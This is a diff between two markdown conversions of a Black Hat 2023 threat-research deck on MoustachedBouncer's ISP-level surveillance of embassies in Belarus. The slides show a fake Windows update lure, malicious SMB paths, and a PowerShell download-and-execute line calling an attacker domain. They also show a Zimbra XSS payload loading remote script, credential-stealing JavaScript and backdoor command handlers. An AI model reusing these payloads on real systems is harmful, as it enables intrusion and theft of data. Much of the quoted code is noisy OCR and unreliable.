@@ -1,6 +1,6 @@
 ---
-title: "Powered Surveillance via Belarus ISPs"
-speakers: ["MoustachedBouncer AitM"]
+title: "MoustachedBouncer: AitM-Powered Surveillance via Belarus ISPs"
+speakers: ["Matthieu Faou"]
 conference: "Black Hat"
 conference_full: "Black Hat USA 2023"
 edition: "USA"
@@ -8,19 +8,25 @@ year: 2023
 source_pdf: "Black Hat USA 2023 slides/MoustachedBouncer AitM-Powered Surveillance via Belarus ISPs.pdf"
 pages: 93
 sha256: "6e28054945965f1d684dfaa178b1a55e1b2c438727c29ad14ca3c5d21e1d40ff"
-text_chars: 30928
-ocr_pages: 37
+text_chars: 28434
+ocr_pages: 40
 has_ocr: true
 redacted_secrets: 0
+ocr_confidence: 88.7
+ocr_unreliable_blocks: 0
+ocr_timeouts: 0
+pages_recovered_from_text_layer: 0
+content_note: "The filename carries no speaker, and 'MoustachedBouncer' is the threat actor rather than a person. Speaker taken from the deck's own title slide (Matthieu Faou, ESET)."
 companion_files: []
 extractor: "pymupdf4llm 1.28.2 + tesseract"
-converted_at: "2026-08-12T00:48:27Z"
+converted_at: "2026-08-12T04:16:00Z"
 ---
-# Powered Surveillance via Belarus ISPs
+# MoustachedBouncer: AitM-Powered Surveillance via Belarus ISPs
 
-**Speakers:** MoustachedBouncer AitM  
+**Speakers:** Matthieu Faou  
 **Conference:** Black Hat USA 2023  
 **Source:** `Black Hat USA 2023 slides/MoustachedBouncer AitM-Powered Surveillance via Belarus ISPs.pdf` (93 pages)
+
 
 ## Slide 1
 
@@ -103,7 +109,8 @@ Assessment: aligned with the interests of Belarus
 
 ## Slide 11
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 92/100 on the text kept, 92/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Adversary-in-the-Middle
@@ -144,7 +151,8 @@ Version Permalink
 
 https://www.welivesecurity.com/wp-content/uploads/2018/01/ESET_Turla_Mosquito.pdf
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 88/100 on the text kept, 88/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Diplomats in Eastern Europe
@@ -156,7 +164,8 @@ www.welivesecurity.com/wp-content/uploads/2018/01/ESET Turla Mosquito.pdf
 
 ## Slide 13
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 95/100 on the text kept, 95/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 3. ABUSING ADOBE FLASH AND FLASH-RELATED
@@ -187,7 +196,8 @@ is still an open question and we would appreciate any feedback if you have more 
 
 ## Slide 14
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 90/100 on the text kept, 83/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Diplomats in Eastern Europe .
@@ -199,18 +209,11 @@ the-middle attack
 2} ISP modifies
 traffic 5]
 Compromised Adobe site somehow
-r? ] —aw compromised
-; °
 I
 I
-_ a
-—> my
 |
-I '
 I
-__ Traffic
 - — interception
-Ce
 Figurel Possible interception points on the path between the potential victim's
 machine and the Adobe servers
 We quickly discarded the hypothesis of a rogue DNS server, since the IP address corresponds
@@ -227,23 +230,22 @@ gateway or proxy of the organization. @ a MitM attack at the Internet Service Pr
 
 ## Slide 16
 
-```
+\```
 msftconnecttest.com
-```
+\```
 
-```
+\```
 updates.microsoft[.]com
-```
+\```
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 95/100 on the text kept, 95/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-fh
 Targeted
 embassy
 Captive portal
 check
-updates.microsoft[.]com
 msftconnecttest.com
 DNS request
 Welcome!
@@ -275,11 +277,12 @@ Connect!
 
 ## Slide 17
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 91/100 on the text kept, 88/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 | Microsoft Office Windows Surface Xbox Deals Support More
-Windows Support What'snew Get Windows 11 Activate  Installupdates Tips |Community
+Windows Support What'snew Get Windows 11 Activate Installupdates Tips |Community
 Learn how to keep in touch and stay productive with Microsoft Teams and Office 365, even when you're working remotely >
 Windows 10, ve ail this article
 1909 and Wind it
@@ -306,7 +309,8 @@ Windows 10, version
 
 ## Slide 18
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 80/100 on the text kept, 75/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 function () {
@@ -321,7 +325,6 @@ var download_url = window.URL.createObjectURL(blob);
 var a = document.createElement("a");
 a.href = download_url;
 a.download = ‘MicrosoftUpdate845255.zip";
-document. body .appendChild(a) ;
 a.click();
 } else {
 }3
@@ -331,34 +334,49 @@ a.click();
 
 msftconnecttest.com
 
-```
+\```
 updates.microsoft[.]com
-```
+\```
 
-```
+\```
 MicrosoftUpdate845255.exe
+\```
+
+
+> Recovered by OCR — confidence 83/100 on the text kept, 73/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
+
+```text
+ft Captive portal
+check BW
+Targeted DPI device
+embassy ER msftconnecttest.com at the ISP .
+DNS request 9)
+Fake update
+MicrosoftUpdate845255.exe
+CEEED |
+Plugins
 ```
 
 ## Slide 20
 
-```
+\```
 MicrosoftUpdate845255.exe
 \\35.214.56[.]2\OfficeBroker\OfficeBroker.exe
-```
+\```
 
 ## Slide 21
 
-```
+\```
 MicrosoftUpdate845255.exe
 \\35.214.56[.]2\OfficeBroker\OfficeBroker.exe
-```
+\```
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 82/100 on the text kept, 80/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Fake update Agh
 MicrosoftUpdate845255.exe
-\\35.214.56[ . ]2\OfficeBroker\OfficeBroker.exe
 35.214.56.2
 CJ Summary #4 Explore © History {) WHOIS
 Basic Information
@@ -371,12 +389,29 @@ Protocols no publicly accessible services
 
 msftconnecttest.com
 
-```
+\```
 updates.microsoft[.]com
-```
+\```
 
-```
+\```
 MicrosoftUpdate845255.exe
+\```
+
+
+> Recovered by OCR — confidence 86/100 on the text kept, 76/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
+
+```text
+ft Captive portal
+check BW
+Targeted DPI device
+embassy a | msftconnecttest.com at the ISP =
+DNS
+))
+updates.microsoft[.]com
+Fake update
+MicrosoftUpdate845255.exe
+Plugins
+---------------------------->
 ```
 
 ## Slide 23
@@ -393,7 +428,8 @@ MicrosoftUpdate845255.exe
 
 ## Slide 26
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 93/100 on the text kept, 93/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 dustries Technology Politics Wealth Pursuits Opinion Businessweek Equality Green CityLab
@@ -408,11 +444,11 @@ Listen to Live Radio >
 
 ## Slide 27
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 91/100 on the text kept, 87/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 @®ee munk school a UNIVERSITY OF Q
-Serer (dat nahn & TORONTO RESEARCH NEWS ABOUT
 Research > Free Expression Online
 BAD TRAFFIC
 Sandvine’s PacketLogic Devices Used to Deploy
@@ -425,21 +461,22 @@ Download this report
 
 ## Slide 28
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 94/100 on the text kept, 85/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 BELARUS
 SUBMISSION TO THE UNITED NATIONS HUMAN RIGHTS COMMITTEE
 124TH SESSION, 8 OCTOBER TO 2 NOVEMBER 2018
 AMNESTY .4,
-INTERNATIONAL = }-
 ```
 
 ## Slide 29
 
 SORM
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 96/100 on the text kept, 96/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Article 17
@@ -460,12 +497,28 @@ SORM
 
 ## Slide 31
 
-```
+\```
 msftconnecttest.com
-```
+\```
 
-```
+\```
 updates.microsoft[.]com
+MicrosoftUpdate845255.exe
+\```
+
+
+> Recovered by OCR — confidence 85/100 on the text kept, 77/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
+
+```text
+ft Captive portal
+check BW
+Targeted DPI device
+embassy a | msftconnecttest.com at the ISP =
+DNS
+))
+updates.microsoft[.]com
+---------------------------->
+Fake update
 MicrosoftUpdate845255.exe
 ```
 
@@ -479,21 +532,18 @@ MicrosoftUpdate845255.exe
 
 Disco
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 80/100 on the text kept, 72/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 4 github_com_mozey_schtasks... .text
 4 github_com_mozey_schtasks... .text
 4 main_DNSQuery_encode text
 4 main_DNSQuestion_encode text
-#1 main_RunQuery text
-#1 main_RunQuery_dwrap_1 text
-7]/main_main text
 github_com_mozey_schtasks_RunEveryMinutes((__int64)"\\\\35.214.56.2\\0fficeBroker\\OfficeBroker.exe", 43LL, v®@, 1LL);
 if ( "\\\\35.214.56.2\\0fficeBroker\\OfficeBroker.exe" )
 log Fatal(v4);
 github_com_mozey_schtasks_RunEveryMinutesHighest (
-(__int64)"\\\\35.214.56.2\\OfficeBroker\\OfficeBroker.exe”",
 43LL,
 v2,
 1LL);
@@ -521,27 +571,27 @@ Kali Linux
 
 ##### **Plugins - SMB shares**
 
-```
+\```
 \\209.19.37[.]184\driverpack\aact.exe
 \\59.6.8[.]25\outlooksync\outlooksync.exe
 \\52.3.8[.]25\oracle\oracleTelemetry.exe
 \\globaltelemetry[.]org\info\driverconfigurator.exe
 \\facebooklogger[.]org\logs\logger.exe
 \\hotkeysstatus[.]com\statuses\checkme.exe
-```
+\```
 
 ## Slide 36
 
 ##### **Plugins - SMB shares**
 
-```
+\```
 \\209.19.37[.]184\driverpack\aact.exe
 \\59.6.8[.]25\outlooksync\outlooksync.exe
 \\52.3.8[.]25\oracle\oracleTelemetry.exe
 \\globaltelemetry[.]org\info\driverconfigurator.exe
 \\facebooklogger[.]org\logs\logger.exe
 \\hotkeysstatus[.]com\statuses\checkme.exe
-```
+\```
 
 `whois hotkeysstatus.com No match for domain "HOTKEYSSTATUS.COM".` 117.61.84[.]5
 
@@ -569,15 +619,11 @@ Kali Linux
 
 ## **3: NightClub**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 66/100 on the text kept, 56/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-£C@> . PAVFileMonitor@filemon@swamp@@ £CO> . PAVSwampFileMonitor@swamp@@ £C@>
-. PAVBaseFilesProvider@filemon@swamp@@  £C@> . PAVSwampFileSender@swamp@@ £C@> . PAVIFileSender@
-nightc lub@seai@Gm sacle . PAVIDataStream@nightclub@def@@ £CO» . PAV? $IStringData@ W@str@def@@ £CO>
-. PAV? $StringData@ W@str@def@@ £CO . PAVIFilesProvider@filemon@swamp@@ £C@» . PAV? $IStrin
-g@ W@str@def@@ £CO> . AV? $StringBase@ W@str@def@@ £CO> . AV? $1IStringData@D@str@def@@ £CO>
-. PAV? $StringData@D@str@defe@ £C@> . PAV?$IString@D@str@def@@ £CO> . PAV? $StringBase@D@s
+. PAVBaseFilesProvider@filemon@swamp@@ £C@> . PAVSwampFileSender@swamp@@ £C@> . PAVIFileSender@
 tr@def@@ £C@> . PAVGammaStreamEncryptor@depth@jasons@@ £C@> . PAVAbsolutizedBase@depth@jasons
 a . PAVIStreamEncryptor@depth@jasons@@ £C@r . ?AVexception@@ £CO> . PAVException@except
 ion@def@@ £C@» . PAVLcgEncryptionBase@depth@jasons@@ £C@> . PAVProHypoxemia@depth@jasons@@
@@ -595,11 +641,11 @@ IFilesListStorage@filemon@swamp@@ £C@> . PAVFilesEnumerator@file@def@@ £C@> . 
 
 Oldest known sample of NightClub
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 90/100 on the text kept, 87/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 ; 2 5 @ 35 security vendors and no sandboxes flagged this file as malicious Cc
-/68 ee2c61216ed691f8bf1fO80fb9c7d7 cfc6f37 0e6f5c0d493db523b48e699a2ec
 C:\Users\Support\Desktop\EsetUpdate-0117583943.eee
 peexe
 Community Score
@@ -614,28 +660,21 @@ Oldest known sample of NightClub
 
 Configuration
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 82/100 on the text kept, 62/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 unk_10@1A8Ce db 7Ch ; | DATA XREF: F_decrypt_string_by_ID+DTr
 Nee
-3 *stemp%
 3; .doc
-3 docx
-: skis
-3 «xlsx
-¢ «Pat
 3 glen.morriss
 glen.morriss75@seznam.cz
-—/_—
 SunyaF@seznam.cz
 smtp.seznam.cz
 we
 we
 we
-db 2)
 db 6
-db )
 ```
 
 ## Slide 42
@@ -652,7 +691,8 @@ SMTP CSmtp library
 
 ## Slide 43
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 91/100 on the text kept, 76/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 220 smtp.mail.com Python SMTP 1.4.2
@@ -666,29 +706,23 @@ EHLO computer
 250 HELP
 AUTH LOGIN
 334 VXNIciBOYW 1IAA==
-Z2x\bi5tb3JyaXNzNzU=
 334 UGFzc3dvemQA
-Po
 235 2.7.0 Authentication successful
-MAIL FROM: <glen.morriss75@seznam.cz>
 250 OK
 RCPT TO:<SunyaF@seznam.cz>
 ```
 
 ## Slide 44
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 87/100 on the text kept, 80/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-ZIU-SMIIFULFO
 250-STARTTLS
 250-AUTH LOGIN PLAIN
 250 HELP
 AUTH LOGIN
-334 VXNIciBOYW 1IAA==
-Z2x\bi5tb3JyaXNzNzU=
 334 UGFzc3dvemQA
-Po
 235 2.7.0 Authentication successful
 MAIL FROM:<glen.morriss75@seznam.cz>
 250 OK
@@ -703,10 +737,10 @@ Y¥-Mailer: The Rat! (v3 02) Profeccinnal
 
 ## Slide 45
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 91/100 on the text kept, 81/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-RLF I PU. sslunyarWseznall.céz-
 250 OK
 DATA
 354 End data with <CR><LF>.<CR><LF>
@@ -718,7 +752,6 @@ X-Priority: 3 (Normal)
 To: <SunyaF@seznam.cz>
 Subject: no
 MIME-Version: 1.0
-Content-Type: multipart/mixed; boundary="__MESSAGE__ID__ 54 yq6f6h6y456345"
 -- MESSAGE ID 54yq6f6éh6y456345
 Content-type: text/plain; charset=US-ASCII
 Content-Transfer-Encoding: 7bit
@@ -727,24 +760,20 @@ file
 
 ## Slide 46
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 93/100 on the text kept, 68/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-nNEpPly-1O. QlIEN.MOMISS/ o@SeZznam.czZ
 X-Priority: 3 (Normal)
 To: <SunyaF@seznam.cz>
 Subject: no
 MIME-Version: 1.0
-Content-Type: multipart/mixed; boundary="__MESSAGE__ID__ 54 yq6féh6y456345"
---__ MESSAGE __ID__54yg6féh6y456345
 Content-type: text/plain; charset=US-ASCII
 Content-Transfer-Encoding: 7bit
 file
---__ MESSAGE __ID__54yg6féh6y456345
 Content-Type: application/x-msdownload; name="TEST FILE.bin"
 Content-Transfer-Encoding: base64
 Content-Disposition: attachment; filename="TEST FILE.bin"
-p5DPwax6a5en441+k3P2b/7wDzJ+RiUtWIsQOKfT 8hxtJ4cjgSHfQoHD70T ZWrvBF59CNIIWkI
 ```
 
 ## Slide 47
@@ -765,10 +794,10 @@ with past versions
 
 ## Slide 49
 
-```
+\```
 %APPDATA%\Microsoft
 \def\Gfr45.cfg
-```
+\```
 
 ##### **Configuration**
 
@@ -778,154 +807,154 @@ with past versions
 
 ## Slide 50
 
-```
+\```
 {
-```
+\```
 
-```
+\```
 "main":{
-```
+\```
 
-```
+\```
 "agent_name":"<filename of the module agent>",
-```
+\```
 
-```
+\```
 "server_name":"<filename of the orchestrator>",
-```
+\```
 
-```
+\```
 "auto_del": {
-```
+\```
 
-```
+\```
 "enabled":<true or false>,
-```
+\```
 
-```
+\```
 "days":<integer>
-```
+\```
 
-```
+\```
 }
-```
+\```
 
-```
+\```
 },
 "storage":{
-```
+\```
 
-```
+\```
 "path":"<path>",
-```
+\```
 
-```
+\```
 "max_size":<integer>,
-```
+\```
 
-```
+\```
 "stop_at_limit":<true or false>
-```
+\```
 
-```
+\```
 }
-```
+\```
 
 ## Slide 51
 
-```
+\```
 },
-```
+\```
 
-```
+\```
 "transport":{
-```
+\```
 
-```
+\```
 "client_mail":"<email address>",
-```
+\```
 
-```
+\```
 "pass":"<password of the email address>",
 "control_mail":"<email address>",
-```
+\```
 
-```
+\```
 "smtp":"<domain>",
-```
+\```
 
-```
+\```
 "pop3":"<domain>",
-```
+\```
 
-```
+\```
 "server_port":<integer>,
-```
+\```
 
-```
+\```
 "use_ssl":<true or false>,
-```
+\```
 
-```
+\```
 "max_file_size":<integer>,
-```
+\```
 
-```
+\```
 "max_daily_traffic":<integer>
-```
+\```
 
-```
+\```
 },
-```
+\```
 
-```
+\```
 "modules":[
-```
+\```
 
 ## Slide 52
 
-```
+\```
 "max_file_size":<integer>,
 "max_daily_traffic":<integer>
-```
+\```
 
-```
+\```
 },
 "modules":[
-```
+\```
 
-```
+\```
 {
-```
+\```
 
-```
+\```
 "name":"<filename of the module>",
-```
+\```
 
-```
+\```
 "enabled":<true or false>,
-```
+\```
 
-```
+\```
 "max_size":<integer>,
 "file":"<filename of the output file>"
-```
+\```
 
-```
+\```
 //[Other fields depending on the module]
-```
+\```
 
-```
+\```
 }
-```
+\```
 
-```
+\```
 ]
-```
+\```
 
-```
+\```
 }
-```
+\```
 
 ## Slide 53
 
@@ -961,7 +990,8 @@ INI
 
 DNS tunneling backdoor
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 87/100 on the text kept, 86/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 inet_pton(2, cc_server_address, &addr->pName) ;
@@ -977,7 +1007,6 @@ do
 String concat( Dst, *ppStringArray);
 _Dst = Dst;
 ++ppStringArray;
-++i;
 }
 while ( i < _ppQueryResults->Data.TXT.dwStringCount );
 _ppQueryResults = ppQueryResults;
@@ -989,25 +1018,25 @@ DNS tunneling backdoor
 
 ##### **Requests**
 
-```
+\```
 xZW1wdHkx.11.1.1.cid
-```
+\```
 
 ## Slide 58
 
 ##### **Requests**
 
-```
+\```
 xZW1wdHkx.11.1.1.cid
-```
+\```
 
 ## Slide 59
 
 ##### **Requests**
 
-```
+\```
 xZW1wdHkx.11.1.1.cid
-```
+\```
 
 ### `empty`
 
@@ -1015,17 +1044,17 @@ xZW1wdHkx.11.1.1.cid
 
 ##### **Replies**
 
-```
+\```
 xYzpcd2luZG93c1xzeXN0ZW0zMlxjYWxjLmV4ZQx.27.2.1.calc
-```
+\```
 
 ## Slide 61
 
 ##### **Replies**
 
-```
+\```
 xYzpcd2luZG93c1xzeXN0ZW0zMlxjYWxjLmV4ZQx.27.2.1.calc
-```
+\```
 
 ###### `c:\windows\system32\calc.exe`
 
@@ -1035,9 +1064,9 @@ xYzpcd2luZG93c1xzeXN0ZW0zMlxjYWxjLmV4ZQx.27.2.1.calc
 
 ###### `x` **`Yzpcd2luZG93c1xzeXN0ZW0zMlxjYWxjLmV4ZQ`** `x.` **`27`** `.2.1.calc`
 
-```
+\```
 Command ID
-```
+\```
 
 ###### `c:\windows\system32\calc.exe`
 
@@ -1047,22 +1076,23 @@ Command ID
 
 ###### `x` **`Yzpcd2luZG93c1xzeXN0ZW0zMlxjYWxjLmV4ZQ`** `x.` **`27`** `.2.1.` **`calc`**
 
-```
+\```
 c:\windows\system32\calc.exe
-```
+\```
 
-```
+\```
 Command ID
-```
+\```
 
-```
+\```
 Command name
 (useless)
-```
+\```
 
 ## Slide 64
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 89/100 on the text kept, 89/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Switch ( command->cmd_id )
@@ -1092,7 +1122,8 @@ Cmd::Move_file(Blocka + 3, &savedregs, &command->argument) ;
 
 ## Slide 65
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 86/100 on the text kept, 86/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 case 23:
@@ -1119,7 +1150,8 @@ Cmd::Search file(Blockc + 3, &command->argument) ;
 
 ## Slide 66
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 87/100 on the text kept, 87/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 case 25:
@@ -1146,7 +1178,8 @@ Cmd::Read file(Blocke + 3, &command->argument) ;
 
 ## Slide 67
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 89/100 on the text kept, 86/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 case 27:
@@ -1194,7 +1227,8 @@ Bored malware researcher waiting for Gfr45.cfg
 
 ## Slide 71
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 93/100 on the text kept, 93/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Winter Vivern: A Look At Re-Crafted Government
@@ -1214,10 +1248,10 @@ in C2 communication over the last several months.
 
 ## Slide 72
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 94/100 on the text kept, 92/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-Mt , CERT-UA
 Computer Emergency Response Team of Ukraine
 About CERT-UA | News | Recommendations | ContactUs | Contacts | fl | w | NX | Q Search
 Main News
@@ -1231,7 +1265,8 @@ software for "scanning infected PCs on viruses".
 
 ## Slide 73
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 95/100 on the text kept, 95/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Exploitation is a Dish Best Served Cold:
@@ -1249,15 +1284,11 @@ Key Takeaways
 
 ## Slide 75
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 94/100 on the text kept, 84/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-—
->) vee https://ocspdep.comyssu.gov.ua -~facd Il Search...
-TNA J
 INS
-Ss
-rhe ocspdep.com ™
 * Files and programs access blocked
 Instruction:
 Download our software!
@@ -1271,7 +1302,8 @@ viruses, you need to remove them!
 
 ## Slide 76
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 94/100 on the text kept, 94/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Scan viruses Signatures started.
@@ -1296,16 +1328,15 @@ Press any key to continue .
 
 ## Slide 77
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 91/100 on the text kept, 87/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 @echo off
 echo Scan viruses signatures started.
 echo Scaning...
 powershell.exe -c "Start-Process -win hidden -filepath 'powershell.exe' -argumentlist
-m1 CT
 *¢$a=whoami;"",""[System.Net.ServicePointManager ]::ServerCertificateValidationCallback = {° $true};iex
-(New-Object Net.WebClient) .DownloadString( ‘https: //troadsecow|[ .]com/fjasmngptwq95824s.php')"""
 echo 3%%
 timeout 3 > NUL
 echo 7%%
@@ -1332,10 +1363,10 @@ timeout 3 > NUL
 
 ## Slide 78
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 94/100 on the text kept, 90/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-ecno /fAnr
 timeout 2 > NUL
 echo 13%%
 timeout 4 > NUL
@@ -1349,7 +1380,6 @@ echo 41%%
 timeout 3 > NUL
 echo 50%%
 timeout 1 > NUL
-echo 574%
 timeout 3 > NUL
 echo 68%%
 timeout 2 > NUL
@@ -1357,12 +1387,10 @@ echo 72%%
 timeout 3 > NUL
 echo 87%%
 timeout 1 > NUL
-echo 98%%
 timeout 2 > NUL
 echo 98%%
 timeout 1 > NUL
 echo Virus not found!
-imgtip.com
 pause
 ```
 
@@ -1373,14 +1401,14 @@ whoami
 arp -a
 dir
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 84/100 on the text kept, 74/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 function sendData($message) {
 try f{
 if ($message -ne $null) {
 (New-Object Net.Webclient).UploadString($singleHost + “taskes/usersfolders
-fuser /5d44c3a771ale354cc83108b40c1b3e6672660cd.php", ($message -join “r'n™))
 }
 } catch {
 ($Error[@])
@@ -1389,16 +1417,13 @@ fuser /5d44c3a771ale354cc83108b40c1b3e6672660cd.php", ($message -join “r'n™)
 function starter {
 $message = try {
 $com = (New-Object Net.Webclient).DownloadString($singleHost + “taskes/usersfolders
-/user/cilfddfbeSdfa8977e19dc0e7fdc2cSaaSd627fFf8. php") ;
 if (Scom.Length -ge 1) f{
 , — tasklist
 whoami
 } catch { =
-($Error[@]) arp —
 sendData($message) ;
 sleep 10;
 starter
-33
 ```
 
 ## Slide 80
@@ -1407,7 +1432,7 @@ starter
 
 ## Slide 81
 
-```
+\```
 https://<victim’s Zimbra
 domain>/public/error.jsp?errCode=
 onload=if(!document.getElementById("x67xasd765")){w
@@ -1417,23 +1442,21 @@ window.x.src='https://oscp-avanguard[.]com/
 5026dbbkj2KJ21fr_[redacted]_Fas2/auth.js';
 document.body.appendChild(window.x);}>&accountName=
 <victim’s email address>
-```
+\```
 
 ## Slide 82
 
 **CVE-2022-27926**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 86/100 on the text kept, 83/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 ZBUG-2084 Prevent Javascript insertion into the error.jsp page on Zim... Browse files
-brad
 ® develop (#674)
- Zc-2.57.0 ... 10.0.0-GA
 Bp zmcommand authored and silentsakky committed on Feb 25, 2022 1 parent 19a8dbb commit ffe1431
 Showing 1 changed file with 4 additions and 4 deletions. Split | Unified |
 CVE-2022-27926
-Vv + 8 MEMM WebRoot/public/error.jsp (O
 ft. @@ -53,7 +53,7 @@
 53 53 <html>
 54 54 <head>
@@ -1455,13 +1478,11 @@ ft. @@ -53,7 +53,7 @@
 
 ## Slide 83
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 86/100 on the text kept, 75/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 function onClickSendCredentials( ){
-var username = encodeURIComponent( document. getElementById( "username" ).value);
-var password = encodeURIComponent(document.getElementById( "password" ).value);
-if (document. getElementById("cv56ds678dfs") ){
 var csrfT = encodeURIComponent( document. getElementById("cv56ds678dfs").value);
 }
 if(!(username. length > © && password.length > 0)){
@@ -1470,29 +1491,23 @@ alertElement.innerHTML = "The username or password is incorrect. Verify that CAP
 and password.";
 return;
 }
-console. log( 'Username', username);
 console. log('Password', password);
 console.log('CsrfT', csrfT);
 var serverAuthRequest = new XMLHttpRequest();
-serverAuthRequest.open("POST", window. location.origin, true);
-serverAuthRequest.setRequestHeader( "Content-Type", "“application/x-www-form-urlencoded" );
 serverAuthRequest.onreadystatechange = function() {
-if(this.readyState === XMLHttpRequest .DONE){
 if (this.response.includes('login.jsp')) {
 var alertElement = document.getElementById("errorMessageDiv" );
 alertElement.innerHTML = "The username or password is incorrect. Verify that CAPS LOCK is not on, and then retype the current
 username and password.";
-getCSRFTokenFromString( this. response) ;
-yelsef{
 var saveCredentialsRequest = new XMLHttpRequest( );
 saveCredentialsRequest.open("POST", ‘'https://' + serverDomain + '/' + serverPath + '/auth.php', true);
-saveCredentialsRequest.setRequestHeader( "Content-Type", "“application/x-www-form-urlencoded" );
 saveCredentialsRequest.onreadystatechange = function() {
 ```
 
 ## Slide 84
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 88/100 on the text kept, 81/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 return;
@@ -1500,23 +1515,17 @@ console. log( 'Username', username);
 console. log('Password', password);
 console.log('CsrfT', csrfT);
 var serverAuthRequest = new XMLHttpRequest();
-serverAuthRequest.open("POST", window. location.origin, true);
-serverAuthRequest.setRequestHeader( "Content-Type", "“application/x-www-form-urlencoded" );
 serverAuthRequest.onreadystatechange = function() {
